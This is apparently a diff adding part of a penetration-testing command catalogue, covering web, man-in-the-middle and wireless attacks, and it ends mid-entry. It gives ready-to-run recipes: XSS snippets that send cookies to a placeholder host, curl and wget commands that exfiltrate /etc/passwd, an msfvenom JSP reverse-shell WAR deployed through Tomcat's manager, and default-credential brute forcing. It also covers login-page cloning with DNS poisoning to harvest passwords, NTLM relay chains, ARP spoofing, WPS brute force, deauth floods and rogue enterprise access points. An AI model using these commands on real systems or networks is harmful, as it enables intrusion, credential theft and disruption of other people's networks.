+    • evasion: --tamper=space2comment,between  --proxy http://127.0.0.1:8080  --delay 1  --tor ; resume is automatic (session file)
+web_steal_cookie                 - JavaScript cookie-exfiltration snippet
+    JavaScript snippets for exfiltrating data from a victim's browser after
+    XSS - image beacon, fetch with no-cors, sendBeacon (survives page unload).
+    When HttpOnly blocks document.cookie, pivot to localStorage, in-DOM CSRF
+    tokens, or performing an in-page action directly.
+    • <script>new Image().src='http://you/c?'+encodeURIComponent(document.cookie)</script>
+    • fetch: fetch('http://you/c',{method:'POST',body:document.cookie,mode:'no-cors'})
+    • navigator.sendBeacon('http://you/c', document.cookie)  - survives page unload
+    • HttpOnly blocks document.cookie -> pivot to localStorage / sessionStorage, CSRF tokens in the DOM, or an in-page action
+web_tomcat                       - Apache Tomcat manager attack notes
+    Notes for attacking Apache Tomcat: find the manager apps, brute the
+    well-known default credentials, then deploy a WAR web shell via the
+    manager API. Also covers Ghostcat (AJP file read/include) and the PUT-JSP
+    CVE. A common quick win on port 8080.
+    • find /manager/html and /host-manager/html ; brute with the tomcat-users defaults (tomcat:tomcat, admin:admin, tomcat:s3cret)
+    • nxc / hydra http-get /manager/html ; then deploy: curl -u user:pass -T shell.war 'http://t:8080/manager/text/deploy?path=/x' ; hit /x/
+    • war payload: msfvenom -p java/jsp_shell_reverse_tcp LHOST=you LPORT=443 -f war -o shell.war
+    • Ghostcat (CVE-2020-1938) AJP 8009 -> read/include files under webapps (WEB-INF); CVE-2017-12617 PUT JSP
+web_wget_curl                    - wget / curl download and request recipes
+    Download and request recipes for wget and curl - authenticated requests,
+    API calls with JSON bodies, client certs, site mirroring, and quick
+    host-side exfil (curl -F, wget --post-file). The two tools you use for
+    every manual HTTP interaction and file pull.
+    • curl -skL -A 'Mozilla/5.0' -o f 'url'  ; -H 'Auth: ..' -b cookies -c cookies -x http://127.0.0.1:8080 -k
+    • curl API: -X POST --data-binary @body.json -H 'Content-Type: application/json' ; -u user:pass ; -E client.pem ; --resolve
+    • wget mirror: wget -r -np -k -p -e robots=off -U Mozilla https://target/   ; -c resume, --limit-rate=200k, -i urls.txt
+    • quick exfil host-side: curl -F 'f=@/etc/passwd' http://you/  or  wget --post-file=/etc/passwd http://you/
+web_whatweb                      - WhatWeb - website technology fingerprinting
+    WhatWeb fingerprints a website's technologies - CMS, framework, web
+    server, JavaScript libraries, analytics, WAF and versions - with
+    adjustable aggression from passive to heavy. Bulk-scan a host list with
+    JSON output. Run it early to pick targeted follow-up tests.
+    • whatweb -a 3 -v https://target        aggression 1 (passive) .. 4 (heavy); -v shows matched plugins
+    • whatweb -i live-hosts.txt --log-json=ww.json     bulk scan + machine-readable output
+    • --user-agent, --header 'X: y', --proxy host:port, -a 1 for a quiet first pass
+    • reports CMS, framework, web server, JS libs, analytics, WAF, versions, default pages
+web_xss                          - cross-site-scripting payloads and cookie stealers
+    Cross-site-scripting payloads and context notes: probe strings, a polyglot
+    that fires in many contexts, break-out patterns for attribute / JS-string
+    / URL / template / DOM-sink contexts, and cookie-stealing and CSP-bypass
+    techniques. The reference for manual XSS testing.
+    • probes: "><img src=x onerror=alert(1)>   <svg/onload=alert(1)>   javascript:alert(1)   '"><script>alert(1)</script>
+    • polyglot: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+    • contexts: attribute (break out with "), JS string (';alert(1);//), URL, template ({{}}), DOM sinks (innerHTML, eval, location)
+    • steal: onerror=this.src='//you/c?'+document.cookie ; CSP bypass via allowed CDN / JSONP / 'unsafe-inline'
+
+MITM ##########################################################################################
+
+mitm_above                       - Above - passive network-protocol sniffer for L2/L3 attack surface
+    Above is a passive network-protocol sniffer that listens on an interface
+    (or reads a pcap) and reports which attackable protocols are present -
+    OSPF, EIGRP, HSRP/VRRP, STP/DTP, LLMNR/NBT-NS/mDNS, CDP/LLDP, cleartext
+    auth. It sends nothing, and prints enough detail (auth type, hashes,
+    timers) to choose the active attack. Run it first on any new LAN.
+    • above --interface eth0 --timer 120           listen, then print the attackable protocols seen
+    • above --input capture.pcap --output found.pcap    triage an existing capture
+    • flags OSPF / EIGRP / HSRP / VRRP / STP / DTP / LLMNR / NBT-NS / mDNS / cleartext auth / CDP / LLDP
+    • prints enough (auth type, hashes, params, hello timers) to choose the active attack; sends nothing
+mitm_inveigh                     - Inveigh - LLMNR / NBNS / mDNS / DHCPv6 spoofing and relay (Windows)
+    Inveigh is the Windows equivalent of Responder: it spoofs LLMNR, NBNS,
+    mDNS and DHCPv6 to capture NetNTLMv1/v2 challenge-response from Windows
+    name lookups for cracking or relaying. Runs as C# or PowerShell from an
+    existing Windows foothold, no admin needed for most listeners.
+    • C#: Inveigh.exe   or PS: Invoke-Inveigh -LLMNR Y -NBNS Y -mDNS Y -HTTP Y -SMB Y -FileOutput Y
+    • captures NTLMv1/2 challenge-response from Windows name lookups for cracking or relaying
+    • -DHCPv6 Y for the mitm6-style path; console commands: GET NTLMV2UNIQUE, GET CLEARTEXT
+    • the Responder equivalent to run from an existing Windows foothold (no admin needed for most listeners)
+mitm_mitm6                       - mitm6 - IPv6 DNS takeover into NTLM relay (WPAD / LDAP)
+    mitm6 abuses the fact that Windows prefers IPv6: it answers DHCPv6 to
+    become the victims' IPv6 DNS server, then feeds them a malicious WPAD
+    entry to force authentication. Chained with ntlmrelayx to LDAP it takes a
+    default AD domain from no credentials to a foothold. Whitelist hosts to
+    limit blast radius.
+    • mitm6 -d corp.local -i eth0            answer DHCPv6, become the victims' IPv6 DNS server
+    • --ignore-nofqdn, --relay <host>, -hw/-w whitelist to limit blast radius to chosen hosts
+    • chain: ntlmrelayx.py -6 -t ldaps://dc -wh wpad.corp.local --delegate-access   (mitm6 forces the auth, relay does the takeover)
+    • outcome: relayed machine/user auth -> add computer / RBCD / DCSync depending on rights
+mitm_arpspoof                    - arpspoof - ARP cache poisoning
+    arpspoof (from dsniff) poisons the ARP caches of a victim and the gateway
+    so their traffic flows through your host. Enable IP forwarding to stay
+    transparent, then sniff, downgrade or modify the traffic. The simplest
+    on-path attack for a switched LAN; killing it lets the caches self-heal.
+    • echo 1 > /proc/sys/net/ipv4/ip_forward     (stay transparent)
+    • arpspoof -i eth0 -t <victim> -r <gateway>      poison both directions in one process
+    • run two one-way instances (-t victim gw  and  -t gw victim) on older versions
+    • follow with tcpdump / net.sniff / a downgrade; restore quietly by killing it (gratuitous ARP re-heals)
+mitm_cpscam                      - cpscam - captive-portal MAC-spoofing bypass
+    cpscam bypasses a captive portal by MAC spoofing: sniff the LAN for a MAC
+    that has already been authorised by the portal, then clone that MAC (and
+    IP) onto your interface to inherit its session. Works because most portals
+    key access on MAC/IP; do it while the real client is idle.
+    • sniff the LAN for a MAC that has already passed the portal (airodump / arp-scan / tcpdump)
+    • cpscam clones that MAC (and IP) onto your interface so you inherit its authorised session
+    • works because most portals key access on MAC/IP; do it when the real client is idle to avoid conflicts
+mitm_dsniff                      - dsniff - clear-text credential sniffer
+    dsniff passively parses cleartext credentials out of many legacy protocols
+    (FTP, HTTP, IMAP/POP3, Telnet, SNMP, LDAP, SMB). The suite also bundles
+    arpspoof, macof (CAM-table flood), dnsspoof and downgrade-MITM helpers.
+    Pair it with an on-path technique to get the traffic to your NIC first.
+    • dsniff -i eth0 -m           auto-parse creds from FTP, HTTP, IMAP, POP3, Telnet, SNMP, LDAP, SMB, NNTP, RIP, etc.
+    • suite also ships: arpspoof, dnsspoof, macof (CAM flood), sshmitm / webmitm (downgrade MITM), filesnarf, mailsnarf, urlsnarf
+    • pair with arpspoof or macof to get the traffic to your NIC first
+mitm_ettercap                    - Ettercap - LAN man-in-the-middle suite
+    Ettercap is a LAN MITM suite: headless or GUI ARP poisoning between
+    selected targets, live credential parsing, DNS spoofing via a plugin, and
+    on-the-fly content rewriting with compiled filters. A more featureful
+    alternative to raw arpspoof for scripted man-in-the-middle.
+    • ettercap -T -q -i eth0 -M arp:remote /<victim>// /<gateway>//     headless ARP MITM
+    • plugins: -P dns_spoof (edit /etc/ettercap/etc/etter.dns), -P isolate, -P autoadd
+    • etterfilter filter.ecf -o filter.ef  then -F filter.ef   for on-the-fly content rewriting
+    • parses creds live; -w dump.pcap to save; -G for the GTK GUI
+mitm_fake_site_dns                         - host a fake site and redirect victims via DNS
+    A recipe for credential harvesting: clone a login page, serve it locally
+    with a handler that logs the POSTed username and password, then redirect
+    victims to it by poisoning name resolution (Responder, ettercap dns_spoof,
+    or a rogue DHCP DNS entry) and 302 them to the real site afterward.
+    • clone a login page (wget -mkEpnp / httrack), serve it with php -S 0.0.0.0:80 and a creds-logging handler
+    • redirect victims: responder (poisons name lookups) or ettercap -P dns_spoof or a rogue DHCP DNS entry
+    • capture the POSTed username/password, then 302 to the real site so the user notices nothing
+    • combine with mitm6 / arpspoof when you need to be on-path for the DNS answer
+mitm_mac_change                  - change / spoof a network-interface MAC address
+    Changes or randomises a network interface's MAC address with macchanger or
+    ip link. Use it for captive-portal and MAC-filter bypass, NAC evasion, and
+    anti-attribution. NetworkManager may need the cloned-mac-address profile
+    setting to make it stick.
+    • ip link set eth0 down && macchanger -r eth0 && ip link set eth0 up      (-r random, -m 00:11:22:.. specific, -p restore, -s show)
+    • or: ip link set dev eth0 address 00:11:22:33:44:55
+    • uses: captive-portal / MAC-filter bypass, NAC evasion, anti-attribution; NetworkManager may need cloned-mac-address in the profile
+mitm_pcredz                      - PCredz - credential extraction from pcap / live traffic
+    PCredz extracts credentials in bulk from a pcap or live interface -
+    NetNTLMv1/v2 (written hashcat-ready), Kerberos, HTTP Basic, SNMP community
+    strings, FTP/POP/SMTP/IMAP, LDAP, DHCPv6 FQDNs - and also carves
+    credit-card numbers. Run it over a long tcpdump capture after a passive
+    session.
+    • Pcredz -f capture.pcap            or   Pcredz -i eth0 -v      (bulk: -d /path/to/pcaps)
+    • pulls NTLMv1/2 (writes hashcat-ready files), Kerberos, HTTP Basic, SNMP community, FTP/POP/SMTP/IMAP, LDAP, DHCPv6 FQDN
+    • also carves credit-card numbers; great post-run over a long tcpdump capture
+mitm_responder                   - Responder - LLMNR / NBT-NS / MDNS poisoner
+    Responder poisons LLMNR, NBT-NS and mDNS so that Windows name-resolution
+    failures come to your rogue SMB/HTTP/SQL/LDAP/WPAD listeners, which
+    capture NetNTLMv1/v2 hashes for cracking or relaying. Analyze mode (-A)
+    watches without poisoning. Often the first move on an internal network.
+    • responder -I eth0 -dwv           poison LLMNR / NBT-NS / mDNS so name lookups come to your rogue servers
+    • rogue HTTP/SMB/SQL/FTP/LDAP/DNS/WPAD listeners capture NetNTLMv1/v2 -> /usr/share/responder/logs/
+    • responder -I eth0 -A            Analyze mode: watch who is asking, poison nothing (safe recon)
+    • turn OFF SMB/HTTP in Responder.conf when relaying, then run ntlmrelayx; feed hashes to hashcat -m 5600
+mitm_scapy                       - Scapy - interactive packet crafting and injection
+    Scapy is a Python library for building, sending, sniffing and dissecting
+    network packets layer by layer. Use it to prototype an attack
+    interactively - craft a spoofed ARP or DNS reply, a malformed packet for
+    fuzzing, a custom probe - then script it. Slow for volume; use
+    purpose-built tools for floods.
+    • send(IP(dst="x")/ICMP())  ;  sendp(Ether()/ARP(op=2, psrc=gw, pdst=victim, hwdst=vmac))  spoof ARP
+    • sr1(IP(dst="x")/TCP(dport=80,flags="S"))  probe  ;  sniff(iface="eth0", filter="udp port 53", prn=lambda p:p.summary())
+    • build DNS / DHCP / 802.11 frames layer by layer; rdpcap()/wrpcap() to replay or save; fuzz() for malformed fields
+    • prototype an attack interactively before scripting it
+mitm_tcpdump                     - tcpdump - CLI packet capture and BPF filters
+    tcpdump is the command-line packet capture tool, using BPF filters to
+    select traffic and writing pcap for later analysis. Rotate by time or size
+    for long captures, drop privileges with -Z. The go-to for a quick capture
+    on a box where you cannot run a GUI; open the pcap in Wireshark afterward.
+    • tcpdump -i eth0 -nn -s0 -w cap.pcap 'host 10.0.0.5 and (port 80 or port 443)'
+    • read: tcpdump -nn -r cap.pcap -A 'tcp port 80'    ; -X hex+ascii ; 'tcp[tcpflags] & tcp-syn != 0'
+    • rotate: -G 300 -w cap-%Y%m%d-%H%M%S.pcap   or   -C 100 -W 10   ; -Z user to drop privs
+    • quick on-box grab; pull the pcap off and open in Wireshark / NetworkMiner
+
+WIRELESS ######################################################################################
+
+wireless_airgeddon               - airgeddon - menu-driven multi-tool Wi-Fi audit framework
+    airgeddon is a menu-driven bash framework that wraps the whole Wi-Fi
+    toolkit - aircrack-ng, hcxdumptool, reaver/bully, hostapd, dnsmasq - into
+    one guided flow: monitor mode, handshake/PMKID capture, deauth, WPS (PIN
+    and Pixie), evil twin with captive portal, WPA-Enterprise and WEP. Good
+    when you want the attack chain without juggling separate tools.
+    • sudo bash airgeddon.sh    then work the menus: interface -> monitor mode -> attack
+    • wraps aircrack-ng, hcxdumptool, reaver/bully, hostapd, dnsmasq, lighttpd for one flow
+    • handshake / PMKID capture, deauth, WPS (PIN + Pixie), Evil Twin + captive portal, WPA-Enterprise, WEP
+    • hands the capture to aircrack / hashcat / john; keeps files under a session dir
+wireless_ble_fuzz                - blefuzz - Bluetooth Low Energy GATT fuzzer
+    blefuzz enumerates a Bluetooth Low Energy device's GATT services and
+    characteristics, then hammers the writable handles with malformed and
+    boundary values, logging the write that triggers a crash, reboot,
+    unexpected notification or unauthenticated state change. Enumerate first
+    with gatttool or bettercap ble.enum.
+    • scan + enumerate GATT services / characteristics, then hammer writable handles with malformed / boundary values
+    • blefuzz -d <MAC> -i hci0   (target device, adapter); logs the write that triggered a fault
+    • watch for: device crash / reboot, unexpected notifications, state change without auth
+    • enumerate first with: gatttool -b <MAC> --primary / --characteristics, or bettercap ble.enum
+wireless_airdecap                - airdecap-ng - decrypt captured WEP/WPA traffic
+    airdecap-ng decrypts a captured WEP or WPA/WPA2 pcap once you have the key
+    - for WPA it also needs a full 4-way handshake in the file. It writes a
+    new capture with the 802.11 headers stripped to plain Ethernet, ready to
+    open in Wireshark. The step after cracking the key.
+    • WPA/WPA2: airdecap-ng -e <ESSID> -p <passphrase> capture.cap    (needs a full 4-way handshake in the file)
+    • WEP: airdecap-ng -w <HEX-KEY> capture.cap
+    • writes capture-dec.cap with 802.11 headers stripped to plain Ethernet - open in Wireshark
+    • -b <BSSID> to limit to one AP, -l keep the 802.11 headers
+wireless_airgraph                - airgraph-ng - client / AP relationship graphs
+    airgraph-ng turns the CSV that airodump-ng writes into a picture: a
+    client-to-AP association map (CAPR) or a common-probe graph (CPG) showing
+    which clients are looking for which SSIDs. A quick visual of the local
+    wireless landscape and of evil-twin opportunities.
+    • airgraph-ng -i dump-01.csv -g CAPR -o capr.png     client-to-AP association map
+    • airgraph-ng -i dump-01.csv -g CPG  -o cpg.png      common-probe graph (which clients seek which SSIDs)
+    • input is the -01.csv that airodump-ng writes; quick visual of the local wireless landscape
+wireless_airodump                - airodump-ng - 802.11 capture and handshake logging
+    airodump-ng is the capture engine of the aircrack-ng suite: put the
+    adapter in monitor mode, survey APs and clients across channels, then lock
+    to one BSSID/channel and write a capture, watching for the 4-way handshake
+    indicator. Pair with aireplay-ng deauth to force the handshake, or
+    hcxdumptool for PMKID.
+    • airmon-ng start wlan0    then    airodump-ng wlan0mon        (survey all channels / bands with --band abg)
+    • focus + capture: airodump-ng -c 6 --bssid AA:BB:.. -w cap wlan0mon      ("WPA handshake" appears top-right on success)
+    • --gpsd geotag, -w writes .cap/.csv/.netxml/.kismet.csv, --manufacturer / --wps extra columns
+    • pair with aireplay-ng deauth to force the handshake, or hcxdumptool for PMKID
+wireless_airtun                  - airtun-ng - virtual tunnel interface for wireless
+    airtun-ng creates a virtual interface (at0) that injects and receives
+    802.11 frames as if it were a normal network interface, optionally
+    decrypting with a known key. Feed at0 to Wireshark or other tools, or use
+    it for repeater/relay and WIDS-tap setups.
+    • airtun-ng -a <BSSID> wlan0mon                 create at0; frames in/out of the air as a normal iface
+    • airtun-ng -a <BSSID> -w <WEP-KEY> wlan0mon    inject/receive decrypted; feed at0 to Wireshark / tools
+    • -t 1 to also act as a WIDS tap; used for repeater / relay setups
+wireless_auto_capture            - automated airmon/airodump/aireplay handshake capture
+    Scripts the airodump + aireplay two-terminal handshake dance: scan, pick a
+    target, send targeted deauths at an associated client, wait for the
+    re-handshake, verify the EAPOL with aircrack-ng, and save the capture
+    (optionally auto-launching a cracker). The hands-off way to get a WPA
+    handshake.
+    • scripts the airmon -> airodump (scan) -> pick target -> aireplay-ng --deauth -> confirm EAPOL flow
+    • picks an associated client, sends targeted deauths, waits for the re-handshake, verifies with aircrack-ng -a2
+    • saves <ESSID>.cap and (optionally) auto-launches hashcat / aircrack against it
+    • the hands-off version of the airodump + aireplay two-terminal dance
+wireless_bettercap               - bettercap - wifi / network / BLE attack framework
+    bettercap is a modular Wi-Fi / network / BLE attack framework driven by an
+    interactive console or caplets. On a monitor interface: wifi.recon,
+    wifi.deauth to force handshakes, wifi.assoc for PMKID, wifi.ap for a rogue
+    AP - plus BLE recon, HID injection, and ARP/DNS spoofing on wired
+    networks. One tool for many layer-2 attacks.
+    • sudo bettercap -iface wlan0mon    then:  wifi.recon on;  wifi.show;  set wifi.handshakes.file /root/hs.pcap
+    • wifi.deauth <BSSID>   force handshakes ;  wifi.assoc <BSSID>   PMKID ;  wifi.ap for a rogue AP
+    • ticker / caplets for automation (-caplet hstk.cap), web UI (ui.* / http-ui on), net.sniff for creds on wired/IP
+    • also does ble.recon / ble.enum, hid (wireless keyboards), arp.spoof, dns.spoof
+wireless_bluetooth               - Bluetooth / BLE recon and attack notes
+    Recon and attack notes for Bluetooth Classic and BLE - device and service
+    discovery with hcitool, bluetoothctl, btmgmt and gatttool, reading and
+    writing BLE characteristics, and notes on Just Works pairing and legacy
+    key weaknesses. Sniffing needs dedicated hardware (Ubertooth, nRF).
+    • classic: hciconfig hci0 up ; hcitool scan / inq ; sdptool browse <MAC> ; l2ping -c 3 <MAC>
+    • modern: bluetoothctl (scan on, devices, info <MAC>, pair) ; btmgmt find ; hcitool lescan for BLE
+    • BLE services: gatttool -b <MAC> -I  (primary, char-read-hnd, char-write-req) ; bettercap ble.enum
+    • sniffing needs an Ubertooth / nRF / dedicated dongle; notes on Just Works pairing and legacy key weakness
+wireless_crackle                 - crackle - crack BLE legacy pairing / decrypt
+    crackle cracks Bluetooth Low Energy legacy pairing: given a capture
+    containing the pairing exchange it brute-forces the 6-digit temporary key,
+    derives the session and long-term keys, and decrypts the traffic. LE
+    Secure Connections is not vulnerable. Capture with an Ubertooth or nRF
+    sniffer first.
+    • crackle -i sniff.pcap -o decrypted.pcap        recover the TK (brute 0-999999), derive STK/LTK, decrypt
+    • needs a capture that contains the legacy pairing exchange (LE Secure Connections is NOT vulnerable)
+    • crackle -i sniff.pcap -l <LTK>   decrypt when you already have the long-term key
+    • capture with an Ubertooth/nRF sniffer first; then read decrypted.pcap in Wireshark
+wireless_giskismet               - giskismet - map Kismet results to SQLite / KML
+    giskismet imports Kismet's netXML output into a SQLite database, then lets
+    you query it (e.g. all open networks) and export the results as KML to
+    open in Google Earth for a site-survey-style map of what was seen where.
+    • giskismet -x Kismet-*.netxml            import networks into wireless.dbl (SQLite)
+    • giskismet -q "select * from wireless where Encryption='None'" -o open.kml     query + export to KML
+    • open the KML in Google Earth for a site-survey style map of what was seen where
+wireless_hashcat                 - hashcat cracking of WPA/WPA2 handshakes and PMKIDs
+    The Wi-Fi cracking workflow with hashcat: convert a capture with
+    hcxpcapngtool to the 22000 hash format (handshakes and PMKIDs), then run
+    dictionary+rules or mask attacks on the GPU. Mode 22000 is slow enough
+    that a targeted mask (phone numbers, all-digits) often beats a big
+    wordlist.
+    • convert first: hcxpcapngtool -o hash.hc22000 capture.pcapng      (handshakes AND PMKIDs -> mode 22000)
+    • dict + rules: hashcat -m 22000 hash.hc22000 rockyou.txt -r rules/best64.rule
+    • mask (e.g. 10-digit phone / all-digit): hashcat -m 22000 hash.hc22000 -a 3 '?d?d?d?d?d?d?d?d?d?d'
+    • hashcat --show hash.hc22000   review cracks; -w 3 workload, --session wifi -O optimised
+wireless_hostapd_wpe             - hostapd-wpe - rogue enterprise AP / EAP creds
+    hostapd-wpe stands up a rogue WPA-Enterprise access point that accepts any
+    EAP identity and logs the username and MSCHAPv2 challenge/response for
+    offline cracking with asleap or hashcat - or serves EAP-GTC to harvest
+    cleartext passwords. Run it as an evil twin with the real AP deauthed.
+    • edit hostapd-wpe.conf (ssid, interface, channel) then: hostapd-wpe hostapd-wpe.conf
+    • accepts any EAP identity; logs username + MSCHAPv2 challenge/response to hostapd-wpe.log
+    • crack: asleap -C <challenge> -R <response> -W rockyou.txt   or   hashcat -m 5500
+    • serves EAP-GTC to harvest cleartext passwords; run with an evil-twin SSID + deauth of the real AP
+wireless_keyview                 - WirelessKeyView - recover stored wifi keys (Windows)
+    WirelessKeyView (NirSoft) recovers saved WLAN profile keys on a
+    compromised Windows laptop, showing the SSID, key type and the key itself.
+    Post-exploitation loot; the built-in equivalent is netsh wlan show profile
+    key=clear.
+    • NirSoft GUI/CLI: WirelessKeyView.exe /stext keys.txt        dump saved WLAN profiles + keys
+    • shows SSID, key type (WPA-PSK / WEP) and the key in HEX and ASCII
+    • CLI equivalent built in: netsh wlan show profile name="SSID" key=clear
+    • post-exploitation loot from a compromised laptop
+wireless_kismapping              - map Kismet GPS data to geographic layouts
+    Takes the GPS data from a Kismet wardrive (.gpsxml / .netxml) and plots
+    access-point positions and tracks onto a map, building coverage heatmaps
+    and signal overlays and exporting KML. The visual-layout companion to
+    giskismet's database approach.
+    • take the .gpsxml / .netxml from a Kismet wardrive and plot AP positions + tracks onto a map
+    • build coverage heatmaps / signal overlays; export KML for Google Earth or tiles for offline maps
+    • complements giskismet (SQLite/KML) with a visual layout pass
+wireless_kismet                  - Kismet - wireless discovery and sniffing
+    Kismet is a passive layer-2 sensor: it puts the card in monitor mode, hops
+    channels and logs every AP, client and probe it hears without ever
+    transmitting, raising WIDS alerts on known attacks. Datasources cover
+    Wi-Fi, BLE, Zigbee and SDR. The 'what is actually on the air' inventory
+    tool; web UI on :2501.
+    • kismet -c wlan0                  (puts the card in monitor mode itself); web UI on http://localhost:2501
+    • passive only - logs every AP / client / probe it hears without transmitting; alerts on attacks (WIDS)
+    • datasources for Wi-Fi, BLE, Zigbee, SDR, ADS-B; remote capture with kismet_cap_* over the network
+    • logs to a .kismet SQLite DB; export pcapng / KML / JSON from the UI or kismetdb_* tools
+wireless_macos                   - macOS built-in wireless diagnostic commands
+    The wireless diagnostic commands built into macOS - the airport utility
+    for scanning and channel sniffing, wdutil info for a full radio/link dump,
+    system_profiler for adapter details. Handy when a Mac is the only field
+    device available.
+    • airport -s   scan  ;  airport -I   current link (RSSI, channel, rate, BSSID)   (path: /System/Library/PrivateFrameworks/Apple80211.framework/.../airport)
+    • airport <iface> sniff <channel>   capture to /tmp/airportSniffXXXX.pcap
+    • wdutil info   full radio + link dump (modern macOS)  ;  system_profiler SPAirPortDataType
+    • handy when a Mac is the only field device
+wireless_mdk3                    - mdk3 - 802.11 stress / deauth / beacon flood
+    mdk3 (and the maintained mdk4) floods raw 802.11 management frames -
+    beacon floods, auth/association floods, deauth 'amok', TKIP Michael
+    shutdown, WIDS confusion, WPA downgrade. Every mode is an active
+    denial-of-service to prove an AP, driver or WIDS falls over, or to knock
+    clients off for handshake capture. Very loud; authorised, time-boxed
+    testing only.
+    • mdk3 wlan0mon d -b blacklist.txt        targeted deauth/disassoc flood (mdk4: mdk4 wlan0mon d -B <BSSID>)
+    • modes: b beacon flood, a auth DoS, d deauth, p SSID probe / brute, m Michael TKIP shutdown, w WIDS confusion
+    • prefer mdk4 (maintained, more modes, 5 GHz); noisy and disruptive - authorised testing only
+wireless_netmon                  - Microsoft Network Monitor wireless capture
+    Microsoft Network Monitor is a legacy Windows capture tool that, with a
+    supported adapter, can capture native 802.11 frames with radio headers.
+    nmcap runs it headless. On modern Windows, Wireshark with Npcap or pktmon
+    is the better choice; open the .cap in Wireshark either way.
+    • legacy Windows capture tool; with a supported adapter it can capture native 802.11 + radio headers
+    • nmcap /Network * /Capture /File c:\cap.cap  for headless capture
+    • open .cap in Wireshark; on modern Windows use Wireshark + Npcap or pktmon instead
+wireless_pcap_stats              - capinfos - capture-file statistics
+    capinfos (from the Wireshark suite) prints summary metadata about a
+    capture file - packet and byte counts, duration, data rate, link type, the
+    app that wrote it, and file hashes - without dissecting every packet. Run
+    it first to triage a directory of captures and record provenance before a
+    long analysis.
+    • capinfos capture.pcapng          packets, bytes, duration, data rate, link type, capture app, hashes
+    • capinfos -T -m *.pcap            one CSV row per file - quick triage of a directory of captures
+    • -c count only, -u duration only, -A everything; sanity-check a capture before a long analysis
+wireless_r00kie_kr00kie          - r00kie-kr00kie - CVE-2017-9417 Kr00k exploit
+    A proof-of-concept for Kr00k (CVE-2019-15126): affected Broadcom/Cypress
+    Wi-Fi chips encrypt buffered frames with an all-zero key after a
+    disassociation. The tool forces the disassociation, captures those frames
+    and decrypts them, recovering small amounts of WPA2 plaintext without the
+    PSK. Loop it for more; confirm the chipset is affected first.
+    • PoC for Kr00k (CVE-2019-15126) - vulnerable Broadcom / Cypress Wi-Fi chips use an all-zero TK after disassociation
+    • r00kie-kr00kie.py -i wlan0mon -b <BSSID> -c <client-MAC>     force disassoc, capture + decrypt the flushed frames
+    • only a handful of buffered frames leak per disassociation; loop deauths to collect more
+    • confirm the target chipset is affected first (Echo, older iPhones, RPi 3, many routers)
+wireless_reaver                  - Reaver - WPS PIN brute force
+    Reaver (t6x fork) attacks Wi-Fi Protected Setup. The 8-digit PIN is only
+    ~11,000 guesses, and recovering it yields the full WPA/WPA2 passphrase.
+    Pixie Dust is the offline shortcut that works in seconds against
+    weak-nonce APs. Find WPS APs with wash first; expect modern APs to lock
+    after a few tries.
+    • reaver -i wlan0mon -b <BSSID> -c <ch> -vv        online 8-digit PIN brute (~11k tries, hours)
+    • Pixie-Dust (offline, seconds on weak stacks): reaver -i wlan0mon -b <BSSID> -c <ch> -K 1    or   bully -b <BSSID> -c <ch> -d wlan0mon
+    • -L ignore locks, -N no nacks, -d 15 delay, --no-associate when running alongside airodump
+    • find WPS APs first: wash -i wlan0mon
+wireless_scapy                   - Scapy 802.11 frame crafting recipes
+    Scapy for 802.11: build, send and sniff individual management frames from
+    Python - a hand-crafted deauth, a beacon flood, a malformed information
+    element for driver fuzzing. The prototyping bench; once a frame works,
+    move to aireplay-ng or mdk4 for volume.
+    • deauth: sendp(RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7), iface="wlan0mon", count=64)
+    • beacon flood: loop Dot11(type=0,subtype=8)/Dot11Beacon()/Dot11Elt(ID="SSID", info=rand)
+    • sniff(iface="wlan0mon", prn=lambda p: p.summary() if p.haslayer(Dot11) else None, lfilter=...)
+    • prototype the frame interactively, then move to aireplay / mdk4 for volume
+wireless_sniffair                - SniffAir - wireless pcap analysis framework
+    SniffAir loads 802.11 captures into a SQLite-backed workspace and
+    auto-parses them into tables - APs, clients, probe requests, EAPOL
+    handshakes, hidden SSIDs - that you query with SQL. Use it to make sense
+    of a large multi-hour wardrive capture; it also bundles some active
+    evil-twin modules.
+    • load: sniffair -> import <capture.pcap>   into a named workspace
+    • auto-parses APs, clients, probe requests, EAPOL handshakes, hidden SSIDs into tables
+    • run queries ("SELECT ... WHERE Encryption LIKE '%WPA2%'") and canned analytics to pull the interesting frames
+    • good for making sense of a big multi-hour wardrive capture
+wireless_stop_monitor            - airmon-ng stop - drop monitor mode
+    The cleanup step: airmon-ng stop removes the monitor-mode interface at the
+    end of a session. Because 'airmon-ng check kill' earlier stopped
+    NetworkManager and wpa_supplicant, you then restart the network stack so
+    the adapter does normal client Wi-Fi again.
+    • airmon-ng stop wlan0mon        then    systemctl restart NetworkManager    (or wpa_supplicant)
+    • airmon-ng check kill earlier is what disabled NM/supplicant - this reverses it
+    • cleanup step so the card does normal managed Wi-Fi again after a capture session
+wireless_terminology             - 802.11 terms, frame types and channel reference
+    A reference for 802.11 concepts - frame types (management, control, data),
+    the WPA2 4-way handshake and its keys, PMKID and EAPOL, channels and
+    widths across 2.4/5/6 GHz, regulatory domains, RSSI/SNR, and interface
+    modes. Background for making sense of the other wireless modules.
+    • frame types: management (beacon, probe req/resp, auth, assoc, deauth), control (RTS/CTS/ACK), data (incl. QoS, EAPOL)
+    • the WPA2 4-way handshake (M1-M4), PMK / PTK / GTK, PMKID, nonce; EAPOL is what you capture to crack
+    • 2.4 GHz ch 1/6/11 non-overlap, 5 GHz / 6 GHz channels, 20/40/80/160 MHz widths, regulatory domains, RSSI vs noise vs SNR
+    • interface modes: managed, monitor, master (AP), ad-hoc, mesh
+wireless_wifi_notes              - end-to-end wifi assessment methodology
+    The end-to-end Wi-Fi assessment methodology on one page: recon, pick a
+    target, capture a handshake or PMKID (deauth if needed), crack offline,
+    decrypt traffic, and report. Branches for WPS, WPA-Enterprise and open
+    networks, and the remediation list (WPA3-SAE, PMF, strong PSK, WPS off).
+    • recon (airodump / kismet) -> pick target -> capture 4-way handshake or PMKID -> deauth a client if needed
+    • crack offline (hashcat -m 22000) -> decrypt captured traffic (airdecap-ng) -> report SSID, BSSID, key, exposure
+    • branch: WPS -> reaver/bully+pixie ; WPA-Enterprise -> hostapd-wpe evil twin ; Open -> captive portal / MITM
+    • record adapter, distance, client count, deauth impact and remediation (WPA3-SAE, PMF, strong PSK, WPS off)
+wireless_wifiphisher             - Wifiphisher - rogue-AP phishing / evil twin
+    Wifiphisher runs a rogue-AP phishing attack: it deauths clients off the
